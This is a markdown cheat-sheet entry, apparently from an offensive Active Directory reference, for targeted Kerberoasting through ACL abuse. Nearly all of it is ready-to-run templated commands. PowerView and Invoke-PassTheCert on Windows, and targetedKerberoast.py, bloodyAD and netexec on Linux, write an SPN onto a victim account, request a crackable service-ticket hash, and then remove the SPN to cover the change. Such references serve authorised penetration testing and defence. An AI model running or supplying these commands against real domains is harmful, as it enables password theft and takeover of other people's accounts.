---
technique: TargetedKerberoasting
category: acl-abuse
ace: GenericAll, GenericWrite, WriteProperty, Validated-SPN
targets: User
protocols: LDAP, Kerberos
remote_capable: true
tags: acl-abuse dacl ad kerberoasting spn ldap kerberos
---

# TargetedKerberoasting

When a controlled object holds `GenericAll`, `GenericWrite`, `WriteProperty`, or `Validated-SPN` over a target user account, the attacker can write a `servicePrincipalName` attribute onto that account. Once the SPN exists, the account becomes eligible for Kerberoasting: the attacker requests a service ticket and obtains an RC4 or AES hash that can be cracked offline to recover the account's password.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control of the object |
| GenericWrite | Write to non-protected attributes, including servicePrincipalName |
| WriteProperty | Write access to a specific property on the object |
| Validated-SPN | The validated write right to add a valid SPN to the account |

## Windows

PowerView sets the SPN and then requests the Kerberoast hash. Invoke-PassTheCert covers certificate-based auth.

### Step 1: Write SPN onto target user (PowerView)

#powershell #powerview #kerberos

Set a servicePrincipalName attribute on a target user using PowerView to make it Kerberoastable.

```powershell title:"Set SPN on target user via PowerView"
Set-DomainObject -Identity "$target_user" -Set @{serviceprincipalname='$spn_value'}
```
<!-- cheat
var target_user
var spn_value
-->

### Step 2: Request Kerberoast hash (PowerView)

#powershell #powerview #kerberos

Request the Kerberoast TGS ticket for the target user after the SPN has been written.

```powershell title:"Request Kerberoast hash via PowerView"
Get-DomainUser "$target_user" | Get-DomainSPNTicket | fl
```
<!-- cheat
var target_user
-->

### Step 3: Remove SPN from target user (PowerView)

#powershell #powerview #kerberos

Clear the servicePrincipalName attribute from the target user to clean up after Kerberoasting.

```powershell title:"Clear SPN from target user via PowerView"
Set-DomainObject -Identity "$target_user" -Clear serviceprincipalname
```
<!-- cheat
var target_user
-->

### Step 4: Import module (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 5: Get LDAP connection (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 6: Write SPN over LDAPS for Kerberoasting (Invoke-PassTheCert)

#powershell #certificate #ldaps

Write an SPN onto a target user over LDAPS using a certificate via Invoke-PassTheCert.

```powershell title:"Write SPN over LDAPS for Kerberoasting using certificate"
Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $ldap -Exploit 'Kerberoasting' -Target "$target_user_dn" -SPN '$spn_value'
```
<!-- cheat
var target_user_dn
var spn_value
-->

## Linux

targetedKerberoast.py automates the full attack in one shot. bloodyAD plus netexec splits it into SPN write and ticket request.

### targetedKerberoast

#ldap #kerberos #python

Enumerate vulnerable targets, write SPNs, request hashes, and optionally clean up in one automated run.

```sh title:"Auto targeted Kerberoast all writable accounts"
targetedKerberoast.py -v -d "$domain" -u "$user" -p "$pass" --dc-host "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### Step 1: Write SPN onto target user (bloodyAD)

#ldap #kerberos #multi-auth

Write a servicePrincipalName onto a specific target user using bloodyAD to make it Kerberoastable.

```sh title:"Write SPN onto target user via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags set object "$target_user" servicePrincipalName -v '$spn_value'
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var spn_value
-->

### Step 2: Request Kerberoast hash (netexec)

#ldap #kerberos #multi-auth

Request Kerberoast TGS hashes for all Kerberoastable accounts using netexec after the SPN has been written.

```sh title:"Kerberoast all SPNed accounts via netexec"
nxc ldap "$rhost_ip" -d "$domain" -u "$user" $nxc_auth --kerberoasting kerberoastables.txt
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->
